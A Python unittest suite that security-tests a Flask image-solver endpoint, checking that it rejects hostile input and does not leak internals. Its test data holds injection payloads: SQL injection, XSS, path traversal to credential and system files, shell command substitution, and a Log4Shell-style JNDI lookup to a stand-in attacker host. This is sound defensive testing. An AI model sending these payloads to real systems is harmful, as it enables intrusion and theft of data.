import unittest
import json
import sys
import os
from unittest.mock import patch

# Add the parent directory to the path to import the app
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from app import app


class TestSolverSecurity(unittest.TestCase):
    """Security tests for the solver service"""

    @classmethod
    def setUpClass(cls):
        """Set up test client"""
        cls.app = app.test_client()
        cls.app.testing = True

    def setUp(self):
        """Set up test data"""
        self.valid_request = {
            "image": [255, 255, 255, 255] * 4,
            "width": 2,
            "height": 2,
            "userId": "security-test-user",
        }

    def test_injection_in_user_id(self):
        """Test SQL injection attempts in user ID"""
        malicious_user_ids = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'; DELETE FROM logs; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/x}",
            "user\x00admin",
            "user\\'; INSERT INTO",
        ]

        for malicious_id in malicious_user_ids:
            with self.subTest(user_id=malicious_id):
                test_data = self.valid_request.copy()
                test_data["userId"] = malicious_id

                response = self.app.post(
                    "/api/solve",
                    data=json.dumps(test_data),
                    content_type="application/json",
                )

                # Should handle malicious input gracefully
                self.assertIn(response.status_code, [200, 400, 500])

                # Should not expose sensitive information
                if response.status_code != 200:
                    response_text = response.get_data(as_text=True)
                    self.assertNotIn("DROP TABLE", response_text)
                    self.assertNotIn("DELETE FROM", response_text)
                    self.assertNotIn("/etc/passwd", response_text)

    def test_oversized_requests(self):
        """Test handling of oversized requests"""
        # Test with extremely large image data
        large_request = {
            "image": [255] * (1000 * 1000 * 4),  # 1M pixel image
            "width": 1000,
            "height": 1000,
            "userId": "large-request-test",
        }

        response = self.app.post(
            "/api/solve",
            data=json.dumps(large_request),
            content_type="application/json",
        )

        # Should handle large requests gracefully (either process or reject)
        self.assertIn(response.status_code, [200, 400, 413, 500])

    def test_malformed_json_injection(self):
        """Test handling of malformed JSON that could cause injection"""
        malformed_payloads = [
            '{"image": [255], "width": 2, "height": 2, "userId": "test", "extra": {"$ne": null}}',
            '{"image": [255], "width": 2, "height": 2, "userId": "test"; DROP TABLE users; --"}',
            '{"image": [255], "width": 2, "height": 2, "userId": "test", "__proto__": {"admin": true}}',
            '{"image": [255], "width": 2, "height": 2, "userId": "test", "constructor": {"prototype": {}}}',
        ]

        for payload in malformed_payloads:
            with self.subTest(payload=payload[:50] + "..."):
                response = self.app.post(
                    "/api/solve", data=payload, content_type="application/json"
                )

                # Should handle malformed JSON safely
                self.assertIn(response.status_code, [200, 400, 500])

    def test_buffer_overflow_attempts(self):
        """Test potential buffer overflow scenarios"""
        overflow_tests = [
            # Extremely large width/height values
            {
                "image": [255] * 16,
                "width": 2**31 - 1,
                "height": 2,
                "userId": "overflow1",
            },
            {
                "image": [255] * 16,
                "width": 2,
                "height": 2**31 - 1,
                "userId": "overflow2",
            },
            {"image": [255] * 16, "width": -1, "height": 2, "userId": "overflow3"},
            {"image": [255] * 16, "width": 2, "height": -1, "userId": "overflow4"},
            # Mismatched array sizes
            {"image": [255] * (2**20), "width": 2, "height": 2, "userId": "mismatch1"},
            {"image": [255] * 4, "width": 1000, "height": 1000, "userId": "mismatch2"},
        ]

        for test_data in overflow_tests:
            with self.subTest(test=test_data["userId"]):
                response = self.app.post(
                    "/api/solve",
                    data=json.dumps(test_data),
                    content_type="application/json",
                )

                # Should handle overflow attempts safely
                self.assertIn(response.status_code, [400, 500])

    def test_denial_of_service_protection(self):
        """Test protection against DoS attacks"""
        # Test with computationally expensive inputs
        expensive_requests = [
            # Large sparse image (many small regions)
            {
                "image": [255 if i % 8 < 4 else 0 for i in range(100 * 100 * 4)],
                "width": 100,
                "height": 100,
                "userId": "dos-test-1",
            },
            # Checkerboard pattern (worst case for algorithm)
            {
                "image": [
                    255 if ((i // 4) % 2) == (((i // 4) // 50) % 2) else 0
                    for i in range(50 * 50 * 4)
                ],
                "width": 50,
                "height": 50,
                "userId": "dos-test-2",
            },
        ]

        for request_data in expensive_requests:
            with self.subTest(test=request_data["userId"]):
                import time

                start_time = time.time()

                response = self.app.post(
                    "/api/solve",
                    data=json.dumps(request_data),
                    content_type="application/json",
                )

                end_time = time.time()
                processing_time = end_time - start_time

                # Should complete within reasonable time (DoS protection)
                self.assertLess(
                    processing_time,
                    60.0,  # 1 minute max
                    f"Request took too long: {processing_time:.2f}s",
                )

                # Should return valid response
                self.assertIn(response.status_code, [200, 400, 500])

    def test_input_type_confusion(self):
        """Test type confusion attacks"""
        type_confusion_tests = [
            {"image": "not_an_array", "width": 2, "height": 2, "userId": "type1"},
            {
                "image": [255, 255, "string", 255],
                "width": 2,
                "height": 2,
                "userId": "type2",
            },
            {
                "image": [255, 255, {"nested": "object"}, 255],
                "width": 2,
                "height": 2,
                "userId": "type3",
            },
            {
                "image": [255, 255, [1, 2, 3], 255],
                "width": 2,
                "height": 2,
                "userId": "type4",
            },
            {
                "image": [255, 255, None, 255],
                "width": 2,
                "height": 2,
                "userId": "type5",
            },
            {
                "image": [255, 255, True, 255],
                "width": 2,
                "height": 2,
                "userId": "type6",
            },
        ]

        for test_data in type_confusion_tests:
            with self.subTest(test=test_data["userId"]):
                response = self.app.post(
                    "/api/solve",
                    data=json.dumps(test_data),
                    content_type="application/json",
                )

                # Should handle type confusion safely
                self.assertIn(response.status_code, [400, 500])

                # Should not expose internal errors
                if response.status_code == 500:
                    response_text = response.get_data(as_text=True)
                    self.assertNotIn("Traceback", response_text)
                    self.assertNotIn('File "', response_text)

    def test_path_traversal_attempts(self):
        """Test path traversal in user ID"""
        path_traversal_ids = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
            "../../../../proc/self/environ",
        ]

        for malicious_id in path_traversal_ids:
            with self.subTest(user_id=malicious_id):
                test_data = self.valid_request.copy()
                test_data["userId"] = malicious_id

                response = self.app.post(
                    "/api/solve",
                    data=json.dumps(test_data),
                    content_type="application/json",
                )

                # Should handle path traversal attempts safely
                self.assertIn(response.status_code, [200, 400, 500])

    def test_unicode_normalization_attacks(self):
        """Test Unicode normalization attacks"""
        unicode_attacks = [
            "user\u202eadmin",  # Right-to-left override
            "user\u0000admin",  # Null byte
            "user\ufeffadmin",  # Byte order mark
            "user\u200badmin",  # Zero width space
            "用户\u0041\u0300",  # Combining characters
            "\ud83d\ude00user",  # Emoji
            "user\u2028admin",  # Line separator
            "user\u2029admin",  # Paragraph separator
        ]

        for unicode_id in unicode_attacks:
            with self.subTest(user_id=repr(unicode_id)):
                test_data = self.valid_request.copy()
                test_data["userId"] = unicode_id

                response = self.app.post(
                    "/api/solve",
                    data=json.dumps(test_data),
                    content_type="application/json",
                )

                # Should handle Unicode attacks safely
                self.assertIn(response.status_code, [200, 400, 500])

    def test_memory_exhaustion_protection(self):
        """Test protection against memory exhaustion"""
        # Test with requests designed to consume excessive memory
        memory_exhaustion_tests = [
            # Claim very large dimensions but provide small data
            {"image": [255] * 16, "width": 10000, "height": 10000, "userId": "memory1"},
            # Provide very large image array
            {
                "image": [255] * (500 * 500 * 4),
                "width": 500,
                "height": 500,
                "userId": "memory2",
            },
        ]

        for test_data in memory_exhaustion_tests:
            with self.subTest(test=test_data["userId"]):
                import psutil
                import os

                process = psutil.Process(os.getpid())
                initial_memory = process.memory_info().rss

                response = self.app.post(
                    "/api/solve",
                    data=json.dumps(test_data),
                    content_type="application/json",
                )

                final_memory = process.memory_info().rss
                memory_increase = final_memory - initial_memory

                # Should not consume excessive memory (more than 500MB)
                self.assertLess(
                    memory_increase,
                    500 * 1024 * 1024,
                    f"Memory increase too large: {memory_increase / 1024 / 1024:.2f}MB",
                )

    def test_http_header_injection(self):
        """Test HTTP header injection attempts"""
        # Test with malicious content-type and other headers
        malicious_headers = [
            ("Content-Type", "application/json\r\nX-Injected: malicious"),
            ("User-Agent", "Mozilla/5.0\r\nX-Injected: malicious"),
            ("Accept", "application/json\r\n\r\nGET /admin HTTP/1.1"),
        ]

        for header_name, header_value in malicious_headers:
            with self.subTest(header=header_name):
                try:
                    response = self.app.post(
                        "/api/solve",
                        data=json.dumps(self.valid_request),
                        headers={header_name: header_value},
                    )
                    # If the request succeeds, it should be handled safely
                    self.assertIn(response.status_code, [200, 400, 500])
                except ValueError as e:
                    # Expected: Werkzeug rejects headers with newline characters
                    self.assertIn("newline", str(e).lower())
                except Exception as e:
                    # Any other exception is also acceptable for security
                    pass

    def test_json_bomb_protection(self):
        """Test protection against JSON bombs"""
        # Test deeply nested JSON structures
        nested_json = {"userId": "test", "width": 2, "height": 2}

        # Create deeply nested structure
        current = nested_json
        for i in range(100):  # 100 levels deep
            current["nested"] = {"level": i}
            current = current["nested"]

        current["image"] = [255, 255, 255, 255] * 4

        response = self.app.post(
            "/api/solve", data=json.dumps(nested_json), content_type="application/json"
        )

        # Should handle deeply nested JSON safely
        self.assertIn(response.status_code, [200, 400, 500])

    def test_algorithmic_complexity_attacks(self):
        """Test attacks that exploit algorithmic complexity"""
        # Create patterns that could cause worst-case performance
        complexity_attacks = [
            # Create image with maximum number of regions (checkerboard)
            {
                "image": [
                    255 if ((i // 4) % 2) != (((i // 4) // 20) % 2) else 0
                    for i in range(20 * 20 * 4)
                ],
                "width": 20,
                "height": 20,
                "userId": "complexity1",
            },
            # Create image with many thin regions
            {
                "image": [255 if (i // 4) % 3 == 0 else 0 for i in range(30 * 30 * 4)],
                "width": 30,
                "height": 30,
                "userId": "complexity2",
            },
        ]

        for attack_data in complexity_attacks:
            with self.subTest(test=attack_data["userId"]):
                import time

                start_time = time.time()

                response = self.app.post(
                    "/api/solve",
                    data=json.dumps(attack_data),
                    content_type="application/json",
                )

                end_time = time.time()
                processing_time = end_time - start_time

                # Should complete within reasonable time
                self.assertLess(
                    processing_time,
                    30.0,
                    f"Complexity attack took too long: {processing_time:.2f}s",
                )

    def test_error_information_disclosure(self):
        """Test that errors don't disclose sensitive information"""
        error_inducing_requests = [
            {"image": None, "width": 2, "height": 2, "userId": "error1"},
            {"image": [255], "width": "invalid", "height": 2, "userId": "error2"},
            {"image": [255] * 16, "width": 2, "height": 2},  # Missing userId
            {"wrong_field": "value"},  # Completely wrong structure
        ]

        for request_data in error_inducing_requests:
            with self.subTest(test=str(request_data)[:50]):
                response = self.app.post(
                    "/api/solve",
                    data=json.dumps(request_data),
                    content_type="application/json",
                )

                if response.status_code in [400, 500]:
                    response_text = response.get_data(as_text=True)

                    # Should not expose sensitive information
                    sensitive_patterns = [
                        "Traceback",
                        'File "/',
                        "line ",
                        "in <module>",
                        "python",
                        "site-packages",
                        "local variables",
                        "global variables",
                        "app.py",
                        "flask",
                    ]

                    for pattern in sensitive_patterns:
                        self.assertNotIn(
                            pattern.lower(),
                            response_text.lower(),
                            f"Sensitive information '{pattern}' exposed in error",
                        )

    def test_resource_exhaustion_limits(self):
        """Test that resource usage is properly limited"""
        # Test concurrent requests to check resource limits
        import threading
        import time

        results = []
        errors = []

        def make_request():
            try:
                start_time = time.time()
                response = self.app.post(
                    "/api/solve",
                    data=json.dumps(self.valid_request),
                    content_type="application/json",
                )
                end_time = time.time()
                results.append((response.status_code, end_time - start_time))
            except Exception as e:
                errors.append(str(e))

        # Launch many concurrent requests
        threads = []
        for _ in range(20):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()

        # Wait for completion
        for thread in threads:
            thread.join()

        # Check that system handled load gracefully
        self.assertEqual(len(errors), 0, f"Errors during load test: {errors}")

        # Most requests should succeed
        successful_requests = sum(1 for status, _ in results if status == 200)
        self.assertGreater(
            successful_requests,
            len(results) * 0.8,
            "Too many requests failed under load",
        )

    @patch("app.log_event")
    def test_logging_injection_protection(self, mock_log_event):
        """Test that log injection is prevented"""
        # Test with log injection attempts in user ID
        log_injection_ids = [
            "user\n[CRITICAL] Fake critical error",
            "user\r\n[ERROR] Injected error message",
            "user\t[WARN] Tab injection",
            "user\x00[INFO] Null byte injection",
            "user\x1b[31m[ERROR]\x1b[0m ANSI injection",
        ]

        for malicious_id in log_injection_ids:
            with self.subTest(user_id=repr(malicious_id)):
                test_data = self.valid_request.copy()
                test_data["userId"] = malicious_id

                response = self.app.post(
                    "/api/solve",
                    data=json.dumps(test_data),
                    content_type="application/json",
                )

                # Should handle request (logging is external)
                self.assertIn(response.status_code, [200, 400, 500])

                # Verify that if logging was called, it received the malicious input
                # (The actual protection would be in the logging service)
                if mock_log_event.called:
                    call_args = mock_log_event.call_args[0]
                    self.assertIn(malicious_id, call_args)

    def test_cors_security(self):
        """Test CORS configuration security"""
        # Test OPTIONS request (preflight)
        response = self.app.options("/api/solve", headers={"Origin": "http://evil.com"})

        # Should handle OPTIONS requests
        self.assertIn(response.status_code, [200, 204])

        # Test actual request with various origins
        origins = [
            "http://localhost:3000",
            "https://evil.com",
            "http://malicious-site.com",
            "javascript:alert(1)",
        ]

        for origin in origins:
            with self.subTest(origin=origin):
                response = self.app.post(
                    "/api/solve",
                    data=json.dumps(self.valid_request),
                    content_type="application/json",
                    headers={"Origin": origin},
                )

                # Should handle all origins (CORS allows all due to development setup)
                self.assertIn(response.status_code, [200, 400, 500])

    def test_content_type_validation(self):
        """Test content type validation"""
        # Test with various content types
        content_types = [
            "application/json",
            "text/plain",
            "application/xml",
            "multipart/form-data",
            "application/x-www-form-urlencoded",
            "text/html",
            "application/javascript",
        ]

        for content_type in content_types:
            with self.subTest(content_type=content_type):
                response = self.app.post(
                    "/api/solve",
                    data=json.dumps(self.valid_request),
                    content_type=content_type,
                )

                # Only JSON should be accepted for this endpoint
                if content_type == "application/json":
                    self.assertIn(response.status_code, [200, 400])
                else:
                    self.assertIn(response.status_code, [400, 415])

    def test_method_security(self):
        """Test HTTP method security"""
        methods_and_data = [
            ("GET", None),
            ("PUT", json.dumps(self.valid_request)),
            ("DELETE", None),
            ("PATCH", json.dumps(self.valid_request)),
            ("HEAD", None),
            ("TRACE", None),
            ("CONNECT", None),
        ]

        for method, data in methods_and_data:
            with self.subTest(method=method):
                response = getattr(
                    self.app, method.lower(), lambda *args, **kwargs: None
                )(
                    "/api/solve",
                    data=data,
                    content_type="application/json" if data else None,
                )

                if response is not None:
                    # Only POST should be allowed for this endpoint
                    if method != "POST":
                        self.assertIn(response.status_code, [404, 405])

    def test_integer_overflow_protection(self):
        """Test protection against integer overflow"""
        overflow_values = [
            2**31,  # 32-bit signed int overflow
            2**32,  # 32-bit unsigned int overflow
            2**63,  # 64-bit signed int overflow
            -(2**31) - 1,  # 32-bit signed int underflow
            float("inf"),  # Infinity
            float("-inf"),  # Negative infinity
        ]

        for overflow_value in overflow_values:
            for field in ["width", "height"]:
                with self.subTest(field=field, value=overflow_value):
                    test_data = self.valid_request.copy()
                    test_data[field] = overflow_value

                    response = self.app.post(
                        "/api/solve",
                        data=json.dumps(test_data),
                        content_type="application/json",
                    )

                    # Should handle overflow safely
                    self.assertIn(response.status_code, [400, 500])

    def test_zip_bomb_protection(self):
        """Test protection against zip bombs (highly repetitive data)"""
        # Create highly repetitive data that compresses well
        repetitive_data = {
            "image": [255, 0, 255, 0] * (100 * 100),  # Highly repetitive pattern
            "width": 100,
            "height": 100,
            "userId": "A" * 1000,  # Very long repetitive user ID
        }

        response = self.app.post(
            "/api/solve",
            data=json.dumps(repetitive_data),
            content_type="application/json",
        )

        # Should handle repetitive data without issues
        self.assertIn(response.status_code, [200, 400, 500])

    def test_deserialization_attacks(self):
        """Test protection against deserialization attacks"""
        # Test with various JSON payloads that could cause issues
        malicious_payloads = [
            # Circular references (will cause JSON serialization issues)
            '{"image": [255], "width": 2, "height": 2, "userId": "test", "self": {"$ref": "#"}}',
            # Large numbers that could cause issues
            '{"image": [255], "width": 1e308, "height": 2, "userId": "test"}',
            # Special JSON values
            '{"image": [255], "width": 2, "height": 2, "userId": "test", "special": NaN}',
            '{"image": [255], "width": 2, "height": 2, "userId": "test", "special": Infinity}',
        ]

        for payload in malicious_payloads:
            with self.subTest(payload=payload[:50] + "..."):
                response = self.app.post(
                    "/api/solve", data=payload, content_type="application/json"
                )

                # Should handle malicious payloads safely
                self.assertIn(response.status_code, [400, 500])

    def test_environment_variable_injection(self):
        """Test that environment variables cannot be injected"""
        # Test with user IDs that could reference environment variables
        env_injection_ids = [
            "${PATH}",
            "$HOME/malicious",
            "${PWD}/../../../etc/passwd",
            "$(whoami)",
            "`id`",
            "%PATH%",
            "%USERPROFILE%",
        ]

        for env_id in env_injection_ids:
            with self.subTest(user_id=env_id):
                test_data = self.valid_request.copy()
                test_data["userId"] = env_id

                response = self.app.post(
                    "/api/solve",
                    data=json.dumps(test_data),
                    content_type="application/json",
                )

                # Should handle environment injection attempts safely
                self.assertIn(response.status_code, [200, 400, 500])

    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks"""
        import time

        # Test with different input sizes to see if timing varies predictably
        timing_tests = [
            {"image": [255] * 16, "width": 2, "height": 2, "userId": "timing1"},
            {"image": [0] * 16, "width": 2, "height": 2, "userId": "timing2"},
            {"image": [255, 0] * 8, "width": 2, "height": 2, "userId": "timing3"},
        ]

        times = []
        for test_data in timing_tests:
            start_time = time.time()
            response = self.app.post(
                "/api/solve",
                data=json.dumps(test_data),
                content_type="application/json",
            )
            end_time = time.time()

            times.append(end_time - start_time)
            self.assertEqual(response.status_code, 200)

        # Times should be relatively consistent (within 2x of each other)
        min_time = min(times)
        max_time = max(times)

        if min_time > 0:
            time_ratio = max_time / min_time
            self.assertLess(
                time_ratio,
                10.0,  # Allow some variance
                f"Timing variance too high: {time_ratio:.2f}x",
            )

    def test_session_fixation_protection(self):
        """Test that no session information is leaked"""
        # Make multiple requests and ensure no session state is maintained
        responses = []

        for i in range(3):
            test_data = self.valid_request.copy()
            test_data["userId"] = f"session-test-{i}"

            response = self.app.post(
                "/api/solve",
                data=json.dumps(test_data),
                content_type="application/json",
            )
            responses.append(response)

        # Check that no session cookies or similar are set
        for response in responses:
            self.assertNotIn("Set-Cookie", response.headers)
            self.assertNotIn("Session-ID", response.headers)

            # Response should be stateless
            self.assertEqual(response.status_code, 200)

    def test_information_disclosure_prevention(self):
        """Test that internal information is not disclosed"""
        # Test various error conditions
        error_tests = [
            {"image": "invalid", "width": 2, "height": 2, "userId": "info1"},
            {"image": [255], "width": -1, "height": 2, "userId": "info2"},
            {"invalid_json": True},
        ]

        for test_data in error_tests:
            with self.subTest(test=str(test_data)[:30]):
                response = self.app.post(
                    "/api/solve",
                    data=json.dumps(test_data),
                    content_type="application/json",
                )

                if response.status_code in [400, 500]:
                    response_text = response.get_data(as_text=True)

                    # Should not reveal internal paths, versions, or stack traces
                    forbidden_info = [
                        "/app/",
                        "python",
                        "flask",
                        "numpy",
                        "scikit-image",
                        "version",
                        "traceback",
                        "exception",
                        "error on line",
                    ]

                    for info in forbidden_info:
                        self.assertNotIn(
                            info.lower(),
                            response_text.lower(),
                            f"Internal information '{info}' disclosed",
                        )


if __name__ == "__main__":
    unittest.main()
